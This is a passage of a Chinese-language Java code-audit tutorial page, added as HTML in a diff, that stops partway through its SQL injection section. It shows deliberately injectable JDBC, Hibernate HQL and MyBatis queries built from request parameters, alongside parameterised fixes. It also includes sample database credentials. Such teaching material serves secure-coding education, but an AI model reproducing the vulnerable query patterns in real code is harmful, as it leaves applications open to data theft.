@@ -1,0 +1,2432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Safe: Java 代码审计</title>
+<meta name="description" content="kubernetes, linux" />
+<meta name="keywords" content="kubernetes, linux" />
+<meta name="generator" content="Org Mode" />
+<link rel="icon" href="/favicon.ico" type="image/x-icon">
+<link rel="me" href="https://emacs.ch/@jasperhsu">
+<meta name="google-adsense-account" content="ca-pub-1741779893655624">
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1741779893655624" crossorigin="anonymous"></script>
+<!-- from -->
+<!--
+<style>#back-to-top{background:#000;-webkit-border-radius:50%;-moz-border-radius:50%;border-radius:50%;bottom:20px;-webkit-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);-moz-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);box-shadow:0 2px 5px 0 rgba(0,0,0,.26);color:#fff;cursor:pointer;display:block;height:56px;opacity:1;outline:0;position:fixed;right:20px;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none;-webkit-transition:bottom .2s,opacity .2s;-o-transition:bottom .2s,opacity .2s;-moz-transition:bottom .2s,opacity .2s;transition:bottom .2s,opacity .2s;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:56px;z-index:1}#back-to-top svg{display:block;fill:currentColor;height:24px;margin:16px auto 0;width:24px}#back-to-top.hidden{bottom:-56px;opacity:0}</style>
+-->
+<link rel="stylesheet" href="/static/aandds.com/css/main.css">
+<link rel="stylesheet" href="/static/aandds.com/css/drollery.min.css">
+<script type="text/javascript" src="/static/aandds.com/js/main.js"></script>
+<!--
+<script id="MathJax-script" async="" src="/static/aandds.com/js/mathjax.js"></script>
+
+<script type="text/javascript" src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
+-->
+<script>
+  window.MathJax = {
+    tex: {
+      ams: {
+        multlineWidth: '85%'
+      },
+      tags: 'ams',
+      tagSide: 'right',
+      tagIndent: '.8em'
+    },
+    chtml: {
+      scale: 1.0,
+      displayAlign: 'center',
+      displayIndent: '0em'
+    },
+    svg: {
+      scale: 1.0,
+      displayAlign: 'center',
+      displayIndent: '0em'
+    },
+    output: {
+      font: 'mathjax-modern',
+      displayOverflow: 'overflow'
+    }
+  };
+</script>
+
+<script
+  id="MathJax-script"
+  async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+</script>
+</head>
+<body>
+<div id="content" class="content">
+<header>
+<h1 class="title">Safe: Java 代码审计</h1>
+</header><nav id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#h:4dc34abe-7dd5-498c-b4fd-f212ad8ad6aa">SQL 注入</a>
+<ul>
+<li><a href="#h:e2b3e864-9f6a-4253-83a6-82a02c45da3d">代码示例</a>
+<ul>
+<li><a href="#h:0163bdaf-c550-4ba6-8934-23f5e387b491">JDBC</a></li>
+<li><a href="#h:1affcb25-cb08-4080-bacb-232e332a49c7">Statement接口常用方法：</a></li>
+<li><a href="#h:c0185cb2-6770-4f14-ba9b-656488a86dd3">JDBC使用预编译</a></li>
+</ul>
+</li>
+<li><a href="#h:32749803-eb78-43d5-9922-4a8181d78f7c">主流的 Java ORM 框架</a>
+<ul>
+<li><a href="#h:e7603282-0c60-408d-ab06-554a95919e8b">Hibernate</a>
+<ul>
+<li><a href="#h:2099e2eb-beec-49bc-a336-b47082e8cf1f">Hibernate预编译</a></li>
+</ul>
+</li>
+<li><a href="#h:489463e7-3983-4a5d-956f-65f929f74413">MyBatis</a>
+<ul>
+<li><a href="#h:2aad10ff-ece9-401e-ac8a-fc8566cc6382">MyBatis 示例</a></li>
+</ul>
+</li>
+<li><a href="#h:39836fa6-995b-4c0a-948f-a6211e7179fc">JdbcTemplate</a></li>
+</ul>
+</li>
+<li><a href="#h:be043971-0d53-4e05-97de-5375c0acf721">解决方案</a></li>
+</ul>
+</li>
+<li><a href="#h:2820635d-23ab-4b5f-9349-8538aeeb767a">命令执行</a>
+<ul>
+<li><a href="#h:5a9ea6ec-3182-43ce-8570-e21a88ceb2d3">解决方案</a></li>
+</ul>
+</li>
+<li><a href="#h:ac2013bf-c814-4784-b33d-8264861dc612">文件上传</a>
+<ul>
+<li><a href="#h:bb0bd9d5-4ade-49fb-a2cd-cf06c0040e52">解决方案</a></li>
+</ul>
+</li>
+<li><a href="#h:06fc75b8-f7f9-4e4b-ac84-1f145cc5f07a">重定向</a>
+<ul>
+<li><a href="#h:ed9622ff-b2dd-4fa3-b12b-96288f415437">解决方案</a></li>
+</ul>
+</li>
+<li><a href="#h:6206af53-fb6c-43d2-9ded-5ed17b1cd2dc">CSRF</a>
+<ul>
+<li><a href="#h:ac2295cd-c04f-44e9-8a4c-0cd06f188802">解决方案</a></li>
+</ul>
+</li>
+<li><a href="#h:07737c63-bf26-405b-bd89-d8691505ea91">SSRF</a>
+<ul>
+<li><a href="#h:3fa31637-f67e-4c07-8f9a-953937d03de7">解决方案</a></li>
+</ul>
+</li>
+<li><a href="#h:fb8a6017-5fcc-483a-b82c-a3481dbba8ad">XSS</a>
+<ul>
+<li><a href="#h:fabd7c38-6363-4c61-8973-bb4ef9e1a513">解决方案</a></li>
+</ul>
+</li>
+<li><a href="#h:e655c591-dc83-4318-9886-a7fdba96e742">XXE</a></li>
+<li><a href="#h:1a2bb8fa-8a6a-4655-8a45-d4da9f954564">反序列化漏洞</a>
+<ul>
+<li><a href="#Fastjson反序列化">Fastjson反序列化</a></li>
+</ul>
+</li>
+<li><a href="#h:8dae0942-47ab-40be-ad06-5a54cb800b13">审计工具-Cobra</a>
+<ul>
+<li><a href="#h:0d57d80b-36a8-4def-8d6a-2c1877295383">介绍</a></li>
+<li><a href="#h:a4e1c5e6-566a-4df5-8ac1-f937427e5906">Installation(安装)</a></li>
+<li><a href="#h:307d6dd6-29d4-4567-a347-1cc8936c1391">CLI模式</a></li>
+<li><a href="#h:771fffa9-b016-451d-8d04-9b4158278426">API接口</a></li>
+<li><a href="#h:b5c50eaf-045d-4dd8-aa97-fee9586e8fde">完整的例子</a></li>
+<li><a href="#h:c25e0a91-72b6-4664-9d0b-2e7a141b5f66">Flow（规则编写流程）</a></li>
+<li><a href="#h:df846e5b-888a-439e-bc63-a70964cf8a48">Rule Template（规则模板）</a></li>
+<li><a href="#h:72fc1a01-f259-4bda-9c97-cbf07f251d08">Example</a>
+<ul>
+<li><a href="#h:7b479a29-655d-4226-b968-70e1e9bf22ef">使用测试代码进行扫描</a></li>
+<li><a href="#h:9eb76fd5-06f7-4557-8b35-19a4b7cf8427">自定义规则</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</nav>
+<ul class="org-ul">
+<li>TAGS: <a href="../index.html">Safe</a></li>
+</ul>
+
+<p>
+<a href="13-code-auditing-of-java-01.html">Java语言入门</a>
+</p>
+
+<p>
+主要内容：
+</p>
+<ul class="org-ul">
+<li>SQL 注入</li>
+<li>命令执行</li>
+<li>XSS</li>
+<li>XXE</li>
+<li>CSRF</li>
+<li>SSRF</li>
+<li>重定向</li>
+<li>上件上传</li>
+<li>Jsonp劫持</li>
+<li>反序列化</li>
+<li>自动化代码审计</li>
+<li>Cobra
+<ul class="org-ul">
+<li>什么是"源代码安全审计(白盒扫描)"</li>
+<li>Cobra 为什么能从源代码中扫描漏洞</li>
+</ul></li>
+</ul>
+<section id="outline-container-h:4dc34abe-7dd5-498c-b4fd-f212ad8ad6aa" class="outline-2">
+<h2 id="h:4dc34abe-7dd5-498c-b4fd-f212ad8ad6aa">SQL 注入</h2>
+<div class="outline-text-2" id="text-h:4dc34abe-7dd5-498c-b4fd-f212ad8ad6aa">
+<p>
+<b>安全威胁</b>
+</p>
+
+<p>
+SQL injection，SQL 注入攻击。
+</p>
+
+<p>
+当应用程序将用户输入的内容，拼接到 SQL 语句中，一起提交给数据库执行时，就会产生 SQL 注入威胁。
+</p>
+
+<p>
+由于用户的输入，也是 SQL 语句的一部分，所以攻击者可以利用这部分可以控制的内容，注入自己定义的语句，改变 SQL 语句执行逻辑，让数据库执行任意自己需要的指令。通过控制部分 SQL 语句，攻击者可以查询数据库中任何自己需要的数据，利用数据库的一些特性，可以直接获取数据库服务器的系统权限。
+</p>
+</div>
+<div id="outline-container-h:e2b3e864-9f6a-4253-83a6-82a02c45da3d" class="outline-3">
+<h3 id="h:e2b3e864-9f6a-4253-83a6-82a02c45da3d">代码示例</h3>
+<div class="outline-text-3" id="text-h:e2b3e864-9f6a-4253-83a6-82a02c45da3d">
+<p>
+只要支持 JDBC 查询，并且开发人员使用了语句拼接，都会产生这种漏洞。
+</p>
+</div>
+<div id="outline-container-h:0163bdaf-c550-4ba6-8934-23f5e387b491" class="outline-4">
+<h4 id="h:0163bdaf-c550-4ba6-8934-23f5e387b491">JDBC</h4>
+<div class="outline-text-4" id="text-h:0163bdaf-c550-4ba6-8934-23f5e387b491">
+<ol class="org-ol">
+<li><b>驱动类</b> ： com.mysql.cj.jdbc.Driver。</li>
+<li><b>连接网址</b> ：</li>
+</ol>
+<p>
+语法：
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #8b2252;">"jdbc:mysql://hostname:port/dbname"</span>,<span style="color: #8b2252;">"username"</span>,<span style="color: #8b2252;">"password"</span>
+</pre>
+</div>
+
+<p>
+<b>MySql 数据库的连接 url</b> ： jdbc:mysql://localhost:3306/dvwa 其中 3306 是端口号，dvwa 是数据库名称。
+</p>
+<ol class="org-ol">
+<li><b>username</b> ：MySql数据库的用户名，默认为root。</li>
+<li><b>Password</b> ： MySql 数据库的密码。</li>
+</ol>
+
+<p>
+代码连接前需下载 jdbc 驱动
+MySQL数据库: <a href="https://dev.mysql.com/downloads/connector/j/">https://dev.mysql.com/downloads/connector/j/</a>
+</p>
+
+<p>
+<a href="https://blog.csdn.net/jufengada9/article/details/105203470">Java导入mysql驱动</a>
+</p>
+
+<p>
+Java(jdbc)示例：
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #a020f0;">package</span> <span style="color: #008b8b;">codeAnalysis</span>;
+<span style="color: #a020f0;">import</span> <span style="color: #008b8b;">java</span>.<span style="color: #008b8b;">sql</span>.<span style="color: #228b22;">Connection</span>;
+<span style="color: #a020f0;">import</span> <span style="color: #008b8b;">java</span>.<span style="color: #008b8b;">sql</span>.<span style="color: #228b22;">DriverManager</span>;
+<span style="color: #8b2252;">/**</span>
+<span style="color: #8b2252;"> * This class is used to create a JDBC</span>
+<span style="color: #8b2252;"> * connection with MySql DB.</span>
+<span style="color: #8b2252;"> *</span>
+<span style="color: #8b2252;"> */</span>
+<span style="color: #a020f0;">public</span> <span style="color: #a020f0;">class</span> <span style="color: #228b22;">JDBCMySqlTest</span> {
+    <span style="color: #b22222;">//</span><span style="color: #b22222;">JDBC and database properties.</span>
+    <span style="color: #a020f0;">private</span> <span style="color: #a020f0;">static</span> <span style="color: #a020f0;">final</span> <span style="color: #228b22;">String</span> <span style="color: #a0522d;">DB_DRIVER</span> =
+        <span style="color: #8b2252;">"com.mysql.cj.jdbc.Driver"</span>;
+    <span style="color: #a020f0;">private</span> <span style="color: #a020f0;">static</span> <span style="color: #a020f0;">final</span> <span style="color: #228b22;">String</span> <span style="color: #a0522d;">DB_URL</span> =
+        <span style="color: #8b2252;">"jdbc:mysql://127.0.0.1:33060/dvwa"</span>;
+    <span style="color: #a020f0;">private</span> <span style="color: #a020f0;">static</span> <span style="color: #a020f0;">final</span> <span style="color: #228b22;">String</span> <span style="color: #a0522d;">DB_USERNAME</span> = <span style="color: #8b2252;">"root"</span>;
+    <span style="color: #a020f0;">private</span> <span style="color: #a020f0;">static</span> <span style="color: #a020f0;">final</span> <span style="color: #228b22;">String</span> <span style="color: #a0522d;">DB_PASSWORD</span> = <span style="color: #8b2252;">""</span>;
+    <span style="color: #a020f0;">public</span> <span style="color: #a020f0;">static</span> <span style="color: #228b22;">void</span> <span style="color: #0000ff;">main</span>(<span style="color: #228b22;">String</span> <span style="color: #a0522d;">args</span>[]){
+        <span style="color: #228b22;">Connection</span> <span style="color: #a0522d;">conn</span> = <span style="color: #008b8b;">null</span>;
+        <span style="color: #a020f0;">try</span>{
+            <span style="color: #b22222;">//</span><span style="color: #b22222;">Register the JDBC driver</span>
+            Class.forName(DB_DRIVER);
+            <span style="color: #b22222;">//</span><span style="color: #b22222;">Open the connection</span>
+            conn = DriverManager.
+                getConnection(DB_URL, DB_USERNAME, DB_PASSWORD);
+            <span style="color: #a020f0;">if</span>(conn != <span style="color: #008b8b;">null</span>){
+                System.out.println(<span style="color: #8b2252;">"Successfully connected."</span>);
+            }<span style="color: #a020f0;">else</span>{
+                System.out.println(<span style="color: #8b2252;">"Failed to connect."</span>);
+            }
+        }<span style="color: #a020f0;">catch</span>(Exception e){
+            e.printStackTrace();
+        }
+    }
+}
+</pre>
+</div>
+
+<p>
+JDBC 语句用于对数据库执行查询。语句是一个接口，它提供了执行查询的方法。我们可以通过调用 Connection接口的 createStatement() 方法得到一个语句对象。
+</p>
+</div>
+</div>
+<div id="outline-container-h:1affcb25-cb08-4080-bacb-232e332a49c7" class="outline-4">
+<h4 id="h:1affcb25-cb08-4080-bacb-232e332a49c7">Statement接口常用方法：</h4>
+<div class="outline-text-4" id="text-h:1affcb25-cb08-4080-bacb-232e332a49c7">
+<ol class="org-ol">
+<li>execute(String SQL)：用于执行SQL DDL语句。</li>
+</ol>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #a020f0;">public</span> <span style="color: #228b22;">boolean</span> <span style="color: #0000ff;">execute</span>(<span style="color: #228b22;">String</span> <span style="color: #a0522d;">SQL</span>)
+</pre>
+</div>
+
+<ol class="org-ol">
+<li>executeQuery(String SQL)：用于执行选择查询，返回一个ResultSet对象。</li>
+</ol>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #a020f0;">public</span> <span style="color: #228b22;">ResultSet</span> <span style="color: #0000ff;">executeQuery</span>(<span style="color: #228b22;">String</span> <span style="color: #a0522d;">SQL</span>)
+</pre>
+</div>
+
+<ol class="org-ol">
+<li>executeUpdate(String SQL *) ： *用于执行插入、更新、删除等查询，返回编号。受影响的行数。</li>
+</ol>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #a020f0;">public</span> <span style="color: #228b22;">int</span> <span style="color: #0000ff;">executeUpdate</span>(<span style="color: #228b22;">String</span> <span style="color: #a0522d;">SQL</span>)
+</pre>
+</div>
+
+<ol class="org-ol">
+<li>executeBatch()：用于批量执行命令。</li>
+</ol>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #a020f0;">public</span> <span style="color: #228b22;">int</span>[] <span style="color: #0000ff;">executeBatch</span>()
+</pre>
+</div>
+
+
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #228b22;">Statement</span> <span style="color: #a0522d;">statement</span> = connection.createStatement();
+<span style="color: #228b22;">String</span> <span style="color: #a0522d;">sql</span> = <span style="color: #8b2252;">"SELECT * FROM crawler_article"</span>;
+<span style="color: #228b22;">ResultSet</span> <span style="color: #a0522d;">rs</span> =statement.executeQuery(sql);
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #b22222;">//</span><span style="color: #b22222;">&#22914;&#26524;@GetMapping("/hello")&#19979;&#26041;&#27861;&#21442;&#25968;&#26159;&#36825;&#26679;&#65292;&#23601;&#20195;&#34920;&#25152;&#26377;&#36755;&#20837;&#37117;&#22312;request&#20013;</span>
+<span style="color: #228b22;">HttpServletRequest</span> <span style="color: #a0522d;">request</span>, <span style="color: #a0522d;">HttpServletResponse</span> response) { <span style="color: #228b22;">JdbcConnection</span> <span style="color: #a0522d;">conn</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">JdbcConnection</span>();
+
+<span style="color: #a020f0;">final</span> <span style="color: #228b22;">String</span> <span style="color: #a0522d;">sql</span> = <span style="color: #8b2252;">"select \* from product where pname like '%"</span> + request.getParameter(<span style="color: #8b2252;">"pname"</span>) + <span style="color: #8b2252;">"%'"</span>;
+
+conn.execqueryResultSet(sql);
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:c0185cb2-6770-4f14-ba9b-656488a86dd3" class="outline-4">
+<h4 id="h:c0185cb2-6770-4f14-ba9b-656488a86dd3">JDBC使用预编译</h4>
+<div class="outline-text-4" id="text-h:c0185cb2-6770-4f14-ba9b-656488a86dd3">
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #a020f0;">public</span> <span style="color: #a020f0;">static</span> <span style="color: #228b22;">void</span> <span style="color: #0000ff;">main</span>(<span style="color: #228b22;">String</span>[] <span style="color: #a0522d;">args</span>) {
+    <span style="color: #a020f0;">try</span> {
+        <span style="color: #a020f0;">final</span> <span style="color: #228b22;">String</span> <span style="color: #a0522d;">driverClassName</span> = <span style="color: #8b2252;">"com.mysql.cj.jdbc.Driver"</span>;
+        <span style="color: #a020f0;">final</span> <span style="color: #228b22;">String</span> <span style="color: #a0522d;">url</span> = <span style="color: #8b2252;">"jdbc:mysql://127.0.0.1:33060/dvwa"</span>;
+        <span style="color: #a020f0;">final</span> <span style="color: #228b22;">String</span> <span style="color: #a0522d;">username</span> = <span style="color: #8b2252;">"cici"</span>;
+        <span style="color: #a020f0;">final</span> <span style="color: #228b22;">String</span> <span style="color: #a0522d;">password</span> = <span style="color: #8b2252;">"123456"</span>;
+        <span style="color: #228b22;">Connection</span> <span style="color: #a0522d;">connection</span> = DriverManager.getConnection(url2, username, password);
+        <span style="color: #228b22;">String</span> <span style="color: #a0522d;">sql</span> = <span style="color: #8b2252;">" SELECT *\n"</span> +
+            <span style="color: #8b2252;">" FROM cici\n"</span> +
+            <span style="color: #8b2252;">" WHERE id = ? and name like ?"</span>;
+        Class.forName(driverClassName);
+        <span style="color: #228b22;">PreparedStatement</span> <span style="color: #a0522d;">preparedStatement</span> = connection.prepareStatement(sql);
+        preparedStatement.setInt(1, 1);
+        preparedStatement.setString(2, <span style="color: #8b2252;">"%ing%"</span>);
+        <span style="color: #228b22;">ResultSet</span> <span style="color: #a0522d;">rst</span> = preparedStatement.executeQuery();
+        rst.next();
+        System.out.println(rst.getString(2));
+    } <span style="color: #a020f0;">catch</span> (Exception e) {
+        e.printStackTrace();
+    }
+}
+</pre>
+</div>
+
+<p>
+Java(ibatis)示例 xml中写法
+</p>
+<div class="org-src-container">
+<pre class="src src-xml"><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">select</span> <span style="color: #a0522d;">id</span>=<span style="color: #8b2252;">"unsafe"</span> <span style="color: #a0522d;">resultMap</span>=<span style="color: #8b2252;">"myResultMap"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+<span style="color: #000000; background-color: #ffffff;">select * from table where name like '%$value$%'</span>
+<span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">select</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+
+<span style="color: #000000; background-color: #ffffff;">UnSafeBean b = sqlMap.queryForObject("value", request.getParameter("name"));</span>
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:32749803-eb78-43d5-9922-4a8181d78f7c" class="outline-3">
+<h3 id="h:32749803-eb78-43d5-9922-4a8181d78f7c">主流的 Java ORM 框架</h3>
+<div class="outline-text-3" id="text-h:32749803-eb78-43d5-9922-4a8181d78f7c">
+<p>
+当前 Java ORM 框架产品有很多，常见的框架有 Hibernate 和 MyBatis，其主要区别如下。
+</p>
+</div>
+<div id="outline-container-h:e7603282-0c60-408d-ab06-554a95919e8b" class="outline-4">
+<h4 id="h:e7603282-0c60-408d-ab06-554a95919e8b">Hibernate</h4>
+<div class="outline-text-4" id="text-h:e7603282-0c60-408d-ab06-554a95919e8b">
+<p>
+Hibernate 框架是一个全表映射的框架。通常开发者只要定义好持久化对象到数据库表的映射关系，就可以通过Hibernate 框架提供的方法完成持久层操作。
+</p>
+
+<p>
+开发者并不需要熟练地掌握 SQL 语句的编写，Hibernate 框架会根据编制的存储逻辑，自动生成对应的 SQL，并调用 JDBC 接口来执行，所以其开发效率会高于 MyBatis 框架。
+</p>
+
+<p>
+然而Hibernate框架自身也存在一些缺点，例如：
+</p>
+<ul class="org-ul">
+<li>多表关联时，对 SQL 查询的支持较差；</li>
+<li>更新数据时，需要发送所有字段；</li>
+<li>不支持存储过程；</li>
+<li>不能通过优化 SQL 来优化性能。</li>
+</ul>
+
+<p>
+这些问题导致其只适合在场景不太复杂且对性能要求不高的项目中使用。
+</p>
+
+<p>
+Hibernate 官网：<a href="http://hibernate.org/">http://hibernate.org/</a>
+</p>
+
+<p>
+<b>Hibernate执行sql语句</b>
+</p>
+<div class="org-src-container">
+<pre class="src src-java">usernameString<span style="color: #b22222;">//</span><span style="color: #b22222;">&#21069;&#21488;&#36755;&#20837;&#30340;&#29992;&#25143;&#21517;</span>
+passwordString<span style="color: #b22222;">//</span><span style="color: #b22222;">&#21069;&#21488;&#36755;&#20837;&#30340;&#23494;&#30721;</span>
+<span style="color: #b22222;">//</span><span style="color: #b22222;">hql&#35821;&#21477;</span>
+<span style="color: #228b22;">String</span> <span style="color: #a0522d;">queryString</span> = <span style="color: #8b2252;">"from User t where t.username= "</span> + usernameString + <span style="color: #8b2252;">" and t.password="</span>+ passwordString;
+<span style="color: #b22222;">//</span><span style="color: #b22222;">&#25191;&#34892;&#26597;&#35810;</span>
+<span style="color: #228b22;">List</span> <span style="color: #a0522d;">result</span> = session.createQuery(queryString).list(); <span style="color: #b22222;">//</span><span style="color: #b22222;">createQuery&#21487;&#20197;&#25509;&#25910;&#21407;&#29983;&#30340;sql&#35821;&#21477;</span>
+</pre>
+</div>
+</div>
+<div id="outline-container-h:2099e2eb-beec-49bc-a336-b47082e8cf1f" class="outline-5">
+<h5 id="h:2099e2eb-beec-49bc-a336-b47082e8cf1f">Hibernate预编译</h5>
+<div class="outline-text-5" id="text-h:2099e2eb-beec-49bc-a336-b47082e8cf1f">
+<div class="org-src-container">
+<pre class="src src-java">usernameString<span style="color: #b22222;">//</span><span style="color: #b22222;">&#21069;&#21488;&#36755;&#20837;&#30340;&#29992;&#25143;&#21517;</span>
+passwordString<span style="color: #b22222;">//</span><span style="color: #b22222;">&#21069;&#21488;&#36755;&#20837;&#30340;&#23494;&#30721;</span>
+<span style="color: #b22222;">//</span><span style="color: #b22222;">hql&#35821;&#21477;</span>
+<span style="color: #228b22;">String</span> <span style="color: #a0522d;">queryString</span> = <span style="color: #8b2252;">"from User t where t.username: usernameString and t.password: passwordString"</span>;
+
+<span style="color: #b22222;">//</span><span style="color: #b22222;">&#25191;&#34892;&#26597;&#35810;</span>
+<span style="color: #228b22;">List</span> <span style="color: #a0522d;">result</span> = session.createQuery(queryString)
+    .setString(<span style="color: #8b2252;">"usernameString "</span>, usernameString )
+    .setString(<span style="color: #8b2252;">"passwordString"</span>, passwordString)
+    .list();
+
+<span style="color: #b22222;">//</span><span style="color: #b22222;">hql&#35821;&#21477;</span>
+<span style="color: #228b22;">String</span> <span style="color: #a0522d;">queryString</span> = <span style="color: #8b2252;">"from User t where t.username=? and t.password=?"</span>;
+<span style="color: #b22222;">//</span><span style="color: #b22222;">&#25191;&#34892;&#26597;&#35810;</span>
+<span style="color: #228b22;">List</span> <span style="color: #a0522d;">result</span> = session.createQuery(queryString)
+    .setString(0, usernameString )
+    .setString(1, passwordString)
+    .list();
+
+<span style="color: #b22222;">// </span><span style="color: #b22222;">like &#26597;&#35810;</span>
+<span style="color: #228b22;">String</span> <span style="color: #a0522d;">query</span>=<span style="color: #8b2252;">"from UserEntity where mobile like :mobile and name like :name"</span>;
+<span style="color: #228b22;">Query</span> <span style="color: #a0522d;">queryObject</span> = <span style="color: #a020f0;">this</span>.systemService.getSession().createQuery(query);
+
+queryObject.setParameter(<span style="color: #8b2252;">"mobile"</span>,<span style="color: #8b2252;">"%"</span>+mobile+<span style="color: #8b2252;">"%"</span>);
+queryObject.setParameter(<span style="color: #8b2252;">"name"</span>,<span style="color: #8b2252;">"%"</span>+name+<span style="color: #8b2252;">"%"</span> );
+<span style="color: #228b22;">List</span>&lt;<span style="color: #228b22;">UserEntity</span>&gt; <span style="color: #a0522d;">userlist</span> = queryObject.list();
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:489463e7-3983-4a5d-956f-65f929f74413" class="outline-4">
+<h4 id="h:489463e7-3983-4a5d-956f-65f929f74413">MyBatis</h4>
+<div class="outline-text-4" id="text-h:489463e7-3983-4a5d-956f-65f929f74413">
+<p>
+MyBatis 框架是一个半自动映射的框架。这里所谓的“半自动”是相对于 Hibernate 框架全表映射而言的，MyBatis框架需要手动匹配提供 POJO、SQL 和映射关系，而 Hibernate 框架只需提供 POJO 和映射关系即可。
+</p>
+
+<p>
+与 Hibernate 框架相比，虽然使用 MyBatis 框架手动编写 SQL 要比使用 Hibernate 框架的工作量大，但 MyBatis框架可以配置动态 SQL 并优化 SQL、通过配置决定 SQL 的映射规则，以及支持存储过程等。对于一些复杂的和需要优化性能的项目来说，显然使用 MyBatis 框架更加合适。
+</p>
+
+<p>
+MyBatis 框架可应用于需求多变的互联网项目，如电商项目；Hibernate 框架可应用于需求明确、业务固定的项目，如 OA 项目、ERP 项目等。
+</p>
+
+<p>
+MyBatis 3 中文文档：<a href="https://mybatis.org/mybatis-3/zh/">https://mybatis.org/mybatis-3/zh/</a>
+</p>
+</div>
+<div id="outline-container-h:2aad10ff-ece9-401e-ac8a-fc8566cc6382" class="outline-5">
+<h5 id="h:2aad10ff-ece9-401e-ac8a-fc8566cc6382">MyBatis 示例</h5>
+<div class="outline-text-5" id="text-h:2aad10ff-ece9-401e-ac8a-fc8566cc6382">
+<p>
+MyBatis 使用 XML 定义语句的方式，MyBatis 提供的所有特性都可以利用基于 XML 的映射语言来实现。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-xml"><span style="color: #000000; background-color: #ffffff;">&lt;?</span><span style="color: #a020f0;">xml</span> <span style="color: #8b2252;">version="1.0" encoding="UTF-8" </span><span style="color: #000000; background-color: #ffffff;">?&gt;</span>
+&lt;!<span style="color: #000000; background-color: #ffffff;">DOCTYPE mapper</span>
+<span style="color: #000000; background-color: #ffffff;">PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"</span>
+<span style="color: #000000; background-color: #ffffff;">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;</span>
+<span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">mapper</span> <span style="color: #a0522d;">namespace</span>=<span style="color: #8b2252;">"org.mybatis.example.BlogMapper"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+<span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">select</span> <span style="color: #a0522d;">id</span>=<span style="color: #8b2252;">"selectBlog"</span> <span style="color: #a0522d;">resultType</span>=<span style="color: #8b2252;">"Blog"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+<span style="color: #000000; background-color: #ffffff;">select * from Blog where id = ${id} # &#25340;&#25509;</span>
+<span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">select</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+<span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">select</span> <span style="color: #a0522d;">id</span>=<span style="color: #8b2252;">"selectBlog"</span> <span style="color: #a0522d;">resultType</span>=<span style="color: #8b2252;">"Blog"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+<span style="color: #000000; background-color: #ffffff;">select * from Blog where id = #{id} # &#39044;&#32534;&#35793;</span>
+<span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">select</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+<span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">mapper</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+</pre>
+</div>
+
+
+<div class="org-src-container">
+<pre class="src src-sh">// Mybatis like
+&lt;select <span style="color: #a0522d;">id</span>=<span style="color: #8b2252;">"findUserByLikeName1"</span> <span style="color: #a0522d;">parameterType</span>=<span style="color: #8b2252;">"java.lang.String"</span> <span style="color: #a0522d;">resultMap</span>=<span style="color: #8b2252;">"user"</span>&gt;
+<span style="color: #a020f0;">select</span> * from t_user where name like <span style="color: #8b2252;">'%${name}%'</span>
+&lt;/select&gt;
+
+// Mybatis like &#20351;&#29992;&#39044;&#32534;&#35793;
+<span style="color: #a020f0;">select</span> * from user where name like concat(<span style="color: #8b2252;">'%'</span>, <span style="color: #b22222;">#</span><span style="color: #b22222;">{name}, '%')</span>
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:39836fa6-995b-4c0a-948f-a6211e7179fc" class="outline-4">
+<h4 id="h:39836fa6-995b-4c0a-948f-a6211e7179fc">JdbcTemplate</h4>
+<div class="outline-text-4" id="text-h:39836fa6-995b-4c0a-948f-a6211e7179fc">
+<p>
+Spring JDBC 提供了多个实用的数据库访问工具，以简化 JDBC 的开发，其中使用最多就是 JdbcTemplate。
+</p>
+
+<p>
